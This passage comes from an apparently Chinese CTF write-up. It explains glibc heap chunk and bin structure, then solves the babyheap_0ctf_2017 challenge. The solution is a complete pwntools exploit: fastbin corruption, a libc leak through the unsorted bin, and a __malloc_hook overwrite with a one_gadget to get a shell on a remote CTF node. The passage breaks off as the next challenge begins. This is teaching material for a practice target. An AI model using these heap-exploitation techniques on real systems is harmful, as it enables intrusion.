的**物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）**是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。</li><li><strong>size</strong>，该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<ul><li><strong>NON_MAIN_ARENA</strong>，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li><strong>IS_MAPPED</strong>，记录当前 chunk 是否是由 mmap 分配的。</li><li><strong>PREV_INUSE</strong>，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li><strong>fd，bk</strong>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<ul><li>fd 指向下一个（非物理相邻）空闲的 chunk</li><li>bk 指向上一个（非物理相邻）空闲的 chunk</li><li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li></ul></li><li><strong>fd_nextsize， bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li></ul></li></ul><div align="right">摘自：<a src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure">CTF Wiki</a></div></blockquote><p>程序在申请空间后便会获得拥有上述结构的数据空间，其中前两个字段占用的空间并不算在程序申请的空间上，即实际占用的空间会比程序申请的更大，且至少大 <kbd>2 * SIZE_SZ</kbd> 字节。值得注意的是，在程序释放堆空间后，<kbd>chunk</kbd> 并不会立即归还系统，而是由堆管理器进行分类管理，不同大小状态的 <kbd>chunk</kbd> 可被分为 <kbd>fast bins</kbd>、<kbd>small bins</kbd>、<kbd>large bins</kbd> 与 <kbd>unsorted bin</kbd> 四类。其中，<kbd>fast bin</kbd> 范围内的为一些较小的 <kbd>chunk</kbd>，一般小于 <kbd>(64 * SIZE_SZ / 4)</kbd>，其使用单链表进行连接并且采用『后进先出』策略，程序分配内存时会优先从这里取。值得注意的是，<kbd>fast bin</kbd> 范围的 <kbd>chunk</kbd> 的 <kbd>inuse</kbd> 始终被置为 <kbd>1</kbd>，因此它们不会和其它被释放的 <kbd>chunk</kbd> 合并。剩余三类 <kbd>bin</kbd> 则被堆管理器维护在同一个数组 <kbd>bins</kbd> 中，数组每个元素对应一个双向链表构成的 <kbd>chunk</kbd> 链，即在每类 <kbd>bin</kbd> 的内部仍然会有多个互不相关的链表来保存不同大小的 <kbd>chunk</kbd>。其中比较特别的是数组第一个元素为 <kbd>unsorted bin</kbd>，该类 <kbd>bin</kbd> 仅由这一条双向链表构成，其主要有两个来源：</p><ol><li>当一个较大的 <kbd>chunk</kbd> 被分割成两半后，如果剩下的部分大于所运行申请的最小 <kbd>chunk</kbd>，就会被放到 <kbd>unsorted bin</kbd> 中。</li><li>释放一个不属于 <kbd>fast bin</kbd> 的 <kbd>chunk</kbd>，并且该 <kbd>chunk</kbd> 不和 <kbd>top chunk</kbd> 紧邻时，该 <kbd>chunk</kbd> 会被首先放到 <kbd>unsorted bin</kbd> 中。</li></ol><p>其中操作系统在程序请求空间时会分配一大块空间，被称为 <kbd>arena</kbd>，后续空间分配都会从这块空间取，主线程的 <kbd>arena</kbd> 为 <kbd>main_arena</kbd>。而程序实际分配空间后剩余部分便是 <kbd>top chunk</kbd>，为当前堆的物理地址最高的 <kbd>chunk</kbd>。</p></li><li><p>在本题中的 <kbd>Fill</kbd> 操作明显存在堆溢出，若通过运作将一个 <kbd>chunk</kbd> 送入 <kbd>unsorted bin</kbd> 中，因为是双向链表，故该 <kbd>chunk</kbd> 中的 <kbd>fd</kbd> 与 <kbd>bk</kbd> 指针均会指向 <kbd>unsorted bin</kbd> 的表头，也就是 <kbd>bins</kbd> 数组的首地址，该地址位于 <kbd>main_arena</kbd> 之中，且偏移固定为 <kbd>0x58</kbd>。值得注意的是 <kbd>main_arena</kbd> 与其他线程不同，其并不存在于堆中，而是一个全局变量，也就是说他被存储于 <kbd>libc</kbd> 的 <kbd>.data</kbd> 段中，而只要知道其在 <kbd>libc</kbd> 中的偏移便可计算出 <kbd>libc</kbd> 的基地址。此外，<kbd>main_arena</kbd> 地址减去 <kbd>0x10</kbd> 便是 <kbd>&#95;&#95;malloc&#95;hook</kbd> 的地址，这是在 <kbd>malloc()</kbd> 函数调用前会执行的钩子函数（<kbd>call</kbd> 其存储的地址），一般情况下该处值全为零，即不会执行任何操作。而若将此处空间填入其他操作的地址，则在下次申请堆空间时，就会执行我们指定的操作。那完蛋，要啥有啥。</p></li><li><p>现在就可以正式开始编写 <kbd>exp</kbd> 了，首先由于后续会有很多冗余的堆操作，因此这里先把他们封装成函数以便于调用，该部分 <kbd>exp</kbd> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./babyheap_0ctf_2017&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27684</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size),encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index,txt</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(index),encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(txt)),encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">    io.send(txt)</span><br><span class="line">    <span class="comment"># sendline 会在末位加换行符，造成干扰</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(index),encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(index),encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure></li><li><p>接下来就要开始动手了，我们需要将一个 <kbd>chunk</kbd> 运作进 <kbd>unsorted bin</kbd> 中并获取该 <kbd>chunk</kbd> 中的 <kbd>fd</kbd> 与 <kbd>bk</kbd> 指针值进而计算 <kbd>main_arena</kbd> 地址。如前文所述只有两种情况可以进去，要么拆分 <kbd>chunk</kbd> 剩下的进去，要么释放 <kbd>chunk</kbd> 不小且不粘顶的进去。进去倒是不难，但是我们还需要通过 <kbd>Dump()</kbd> 函数来获取数据，而仅仅送进去的话就不能输出了，因此这里就需要点手段了：首先申请六块空间，<kbd>chunk0</kbd> 与 <kbd>chunk3</kbd> 留作填充后续空间的入口，<kbd>chunk4</kbd> 留作后面 <kbd>unsorted bin</kbd> 唯一成员，<kbd>chunk5</kbd> 则是将 <kbd>top chunk</kbd> 隔开，以便 <kbd>chunk4</kbd> 进入 <kbd>unsorted bin</kbd>。<kbd>chunk1</kbd> 与 <kbd>chunk2</kbd> 则释放进 <kbd>fast bin</kbd> 的同一链表中，由于其为后进先出的单链表，所以后释放的 <kbd>chunk2</kbd> 的 <kbd>fd</kbd> 指针将存放 <kbd>chunk1</kbd> 的地址。这部分 <kbd>exp</kbd> 如下，申请空间大小不一定与下面一致，能保证 <kbd>chunk1、2</kbd> 能进 <kbd>fast bin</kbd> 中同一链表及 <kbd>chunk4</kbd> 能进 <kbd>unsorted bin</kbd> 即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># chunk0</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># chunk1</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># chunk2</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># chunk3</span></span><br><span class="line">allocate(<span class="number">0x80</span>) <span class="comment"># chunk4</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># chunk5</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>此时堆中的数据如下图所示，值得注意的是每个 <kbd>chunk</kbd> 的 <kbd>size</kbd> 末位都为 <kbd>1</kbd>，这并不是因为空间对齐后会多占一位，而是该数据末三个比特位为特殊标记位，<psw>毕竟对齐完后三位没有任何用，所以拿来做标记了</psw>，多出来的 <kbd>1</kbd> 是因为 <kbd>PREV_INUSE</kbd> 处于被置为状态。</p><img src="0008.webp" alt="" style="zoom:75%"><p>若通过 <kbd>chunk0</kbd> 将该地址覆写为 <kbd>chunk4</kbd> 的地址，那么就等同于 <kbd>fast bin</kbd> 的链表中存放的是 <kbd>chunk2</kbd> 与 <kbd>chunk4</kbd>。小端序的缘故，只需修改最后一字节即可，该部分 <kbd>exp</kbd> 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure><p>接下来再申请两块小空间，程序就会把 <kbd>fast bin</kbd> 中的 <kbd>chunk</kbd> 拿出来依次依大小分掉。不过在此之前，由于 <kbd>chunk4</kbd> 的大小与其在 <kbd>fast bin</kbd> 中的索引位并不一致，而程序从 <kbd>fast bin</kbd> 分配空间时会验证这一点，因此这里需要先将 <kbd>chunk4</kbd> 的 <kbd>size</kbd> 覆写为 <kbd>0x21</kbd>，分配结束后再覆写回来就好了。该部分 <kbd>exp</kbd> 如下，由前期审计代码可知新分配内存时会再次启用此前释放的索引，而非不断增加，因此该两块 <kbd>chunk</kbd> 对应索引为 <kbd>1</kbd> 和 <kbd>2</kbd>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># new_chunk1</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># new_chunk2</span></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br></pre></td></tr></table></figure><p>此时 <kbd>new_chunk2</kbd> 与 <kbd>chunk4</kbd> 指向的便是同一个地址，现在释放 <kbd>chunk4</kbd> 他就会进入 <kbd>unsorted bin</kbd>，而再用 <kbd>Dump()</kbd> 输出 <kbd>new_chunk2</kbd> 就可以拿到其两个指针了，<psw>就是为这瓶醋包的这顿饺子</psw>。该地址减去 <kbd>0x58</kbd> 便是 <kbd>main_arena</kbd> 的地址。该部分 <kbd>exp</kbd> 如下，两个指针都一样，取前八位就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Content: \n&quot;</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x58</span></span><br></pre></td></tr></table></figure></li><li><p>拿到 <kbd>main_arena</kbd> 之后就可以获得 <kbd>libc</kbd> 基址以及钩子函数 <kbd>&#95;&#95;malloc&#95;hook</kbd> 的地址，找到 <kbd>libc</kbd> 中的 <kbd>one&#95;gadget</kbd>（即执行 <kbd>execve(&#34;bin/sh&#34;,NULL,NULL)</kbd> 的代码片段）放入 <kbd>&#95;&#95;malloc&#95;hook</kbd> 的位置就可以拿到 Shell 了。如下为获取两个地址的部分 <kbd>exp</kbd>，其中 <kbd>main_arena</kbd> 的偏移并不能直接从工具查出，因此可使用 <kbd>&#95;&#95;malloc&#95;hook</kbd> 的地址来算出 <kbd>libc</kbd> 基地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br></pre></td></tr></table></figure><p>然后先找一下 <kbd>one&#95;gadget</kbd> 的位置，可使用 <kbd>one&#95;gadget</kbd> 工具，专业寻找 <kbd>one&#95;gadget</kbd>，不过需要满足 <kbd>constraints</kbd> 内的条件，实测只有 <kbd>0x4526a</kbd> 符合。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─$ one_gadget ./libc-2.23.so</span><br><span class="line">0x45216 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>然后就该对 <kbd>&#95;&#95;malloc&#95;hook</kbd> 的位置开始写入了，要通过堆溢出写入就只能再其之前有一块堆空间，正规途径当然不行，但是可以参考前文将 <kbd>fast bin</kbd> 中强行加入 <kbd>chunk4</kbd> 一样将 <kbd>&#95;&#95;malloc&#95;hook</kbd> 之前的一块空间纳入 <kbd>fast bin</kbd> 中。首先找一下这块空间，直接找的话并没有适合加入 <kbd>fast bin</kbd>（空间需要小于 <kbd>0x80</kbd> 即 <kbd>size</kbd> 需要小于 <kbd>0x91</kbd>)，不过仔细观察可以发现是可以凑出来的，将地址偏移一下即可直观地看出来，注意小端序问题。我们将这类空间称为 <kbd>fake chunk</kbd>，字面意思。</p><img src="0009.webp" alt="" style="zoom:75%"><p>上述空间作为 <kbd>chunk</kbd> 即 <kbd>size</kbd> 值为 <kbd>0x7F</kbd>，对应数据空间为 <kbd>0x68</kbd>，要像模像样地放入同一张 <kbd>fast bin</kbd> 链表中就需要用一个 <kbd>0x58</kbd> 到 <kbd>0x68</kbd> 的 <kbd>chunk</kbd> 来完成。创建大小为 <kbd>0x60</kbd> 的 <kbd>chunk</kbd> 并释放后，这块空间就会进入 <kbd>fast bin</kbd>，而此前放入 <kbd>unsorted bin</kbd> 中的那块 <kbd>chunk</kbd> 大小为 <kbd>0x80</kbd>，所以新申请的 <kbd>chunk</kbd> 会从这里拿空间，并且被赋予索引 <kbd>4</kbd>。值得注意的是，<kbd>new_chunk2</kbd> 地址依旧指向该处，即可以直接将此前获取 <kbd>fake chunk</kbd> 地址从 <kbd>new_chunk2</kbd> 处写入，这样 <kbd>fake chunk</kbd> 就成功加入 <kbd>fast bin</kbd> 了。该部分 <kbd>exp</kbd> 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0x60</span>) <span class="comment"># new_chunk4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br></pre></td></tr></table></figure><p>接下来只需申请两份 <kbd>0x60</kbd> 的空间就可以将 <kbd>fake chunk</kbd> 正式作为可访问的堆内存，该部分 <kbd>exp</kbd> 如下，值得注意的是 <kbd>fake chunk</kbd> 那块空间现在被赋予了索引 <kbd>6</kbd>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0x60</span>) <span class="comment"># new_new_chunk4</span></span><br><span class="line">allocate(<span class="number">0x60</span>) <span class="comment"># chunk6</span></span><br></pre></td></tr></table></figure><p>随后将此前拿到的 <kbd>one&#95;gadget</kbd> 通过索引 <kbd>6</kbd> 覆写到 <kbd>&#95;&#95;malloc&#95;hook</kbd> 的位置即可。该部分 <kbd>exp</kbd> 如下，其中写入点到目的地的偏移为 <kbd>0x13</kbd>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br></pre></td></tr></table></figure><p>最后，随意申请一块空间，Shell 就到手了。</p></li><li><p>完整 <kbd>exp</kbd> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./babyheap_0ctf_2017&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27684</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size),encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index,txt</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(index),encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(txt)),encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">    io.send(txt)</span><br><span class="line">    <span class="comment"># sendline 会在末位加换行符，造成干扰</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(index),encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(index),encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># chunk0</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># chunk1</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># chunk2</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># chunk3</span></span><br><span class="line">allocate(<span class="number">0x80</span>) <span class="comment"># chunk4</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># chunk5</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># new_chunk1</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># new_chunk2</span></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Content: \n&quot;</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x58</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>) <span class="comment"># new_chunk4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>) <span class="comment"># new_new_chunk4</span></span><br><span class="line">allocate(<span class="number">0x60</span>) <span class="comment"># chunk6</span></span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">23</span>) <span class="comment"># 拿来吧你</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="ciscn-2019-s-3">ciscn_2019_s_3</h2><ul><li><p>先验文件，本题文件为 <kbd>64</kbd> 位可执行文件，仅开了 NX 保护。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ./ciscn_s_3      </span><br><span class="line">./ciscn_s_3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=af580816080db5e4d1d93a271087adaee29028e8, not stripped</span><br><span class="line"></span><br><span class="line">└─$ 